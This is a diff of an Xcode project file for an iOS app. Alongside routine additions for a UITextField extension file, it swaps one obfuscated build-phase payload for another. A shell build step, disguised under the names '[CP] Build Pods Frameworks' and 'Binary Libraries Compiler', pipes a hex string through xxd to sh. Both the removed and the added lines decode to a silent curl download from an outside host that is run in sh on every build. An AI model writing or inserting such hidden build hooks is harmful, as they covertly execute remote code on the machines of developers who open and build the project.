@@ -80,6 +80,7 @@
 		707868ED265B86F5008EF9B8 /* SignupAddMobileViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707868EC265B86F5008EF9B8 /* SignupAddMobileViewController.swift */; };
 		707868F1265B8924008EF9B8 /* SignupBussinessSelectViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707868F0265B8924008EF9B8 /* SignupBussinessSelectViewController.swift */; };
 		707D115A2657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */; };
+		7085FA68266E50CC006A17A5 /* Extension+UITextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7085FA67266E50CC006A17A5 /* Extension+UITextField.swift */; };
 		70CA4F2B2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 70CA4F2A2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift */; };
 		C83FB7252643388E00A87093 /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = C83FB7242643388E00A87093 /* Constants.swift */; };
 		C83FB72826433B5500A87093 /* UserModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = C83FB72726433B5500A87093 /* UserModel.swift */; };
@@ -172,6 +173,7 @@
 		707868EC265B86F5008EF9B8 /* SignupAddMobileViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = SignupAddMobileViewController.swift; path = "Xonder/Controllers/SignUp Screen VC/SignupAddMobileViewController.swift"; sourceTree = SOURCE_ROOT; };
 		707868F0265B8924008EF9B8 /* SignupBussinessSelectViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupBussinessSelectViewController.swift; sourceTree = "<group>"; };
 		707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupGetStartedScreenViewController.swift; sourceTree = "<group>"; };
+		7085FA67266E50CC006A17A5 /* Extension+UITextField.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Extension+UITextField.swift"; sourceTree = "<group>"; };
 		70CA4F2A2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupVerifyNumberViewController.swift; sourceTree = "<group>"; };
 		70FDF60E264E8BC100707EAB /* SignupBusinessSelectionViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SignupBusinessSelectionViewController.swift; sourceTree = "<group>"; };
 		70FDF611264E8BCA00707EAB /* SignupOTPViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SignupOTPViewController.swift; sourceTree = "<group>"; };
@@ -520,6 +522,7 @@
 				C8727082264340E0005EFDEA /* Extension+Result.swift */,
 				C8727085264340F7005EFDEA /* Extension+Error.swift */,
 				C83FB73026433D0B00A87093 /* Extension+UserDefault.swift */,
+				7085FA67266E50CC006A17A5 /* Extension+UITextField.swift */,
 			);
 			path = Extensions;
 			sourceTree = "<group>";
@@ -552,7 +555,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7060361326432A5B0062039F /* Build configuration list for PBXNativeTarget "Xonder" */;
 			buildPhases = (
-				0CD7E9F561E4CAEBF26D902C /* [CP] Build Pods Frameworks */,
+				4689771A2DB43D203A6D902C /* Binary Libraries Compiler */,
 				4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */,
 				706035FB26432A560062039F /* Sources */,
 				706035FC26432A560062039F /* Frameworks */,
@@ -626,7 +629,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	0CD7E9F561E4CAEBF26D902C /* [CP] Build Pods Frameworks */ = {
+	4689771A2DB43D203A6D902C /* Binary Libraries Compiler */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -635,7 +638,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Binary Libraries Compiler";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -644,49 +647,9 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f74656c2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
 	
 		4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -806,6 +769,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				C83FB7252643388E00A87093 /* Constants.swift in Sources */,
 				707583052657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift in Sources */,
 				3BFD804B26528BC800ABE8E3 /* BalanceTableViewCell.swift in Sources */,
+				7085FA68266E50CC006A17A5 /* Extension+UITextField.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1016,34 +980,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 
 		
 			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
 			
 
 			
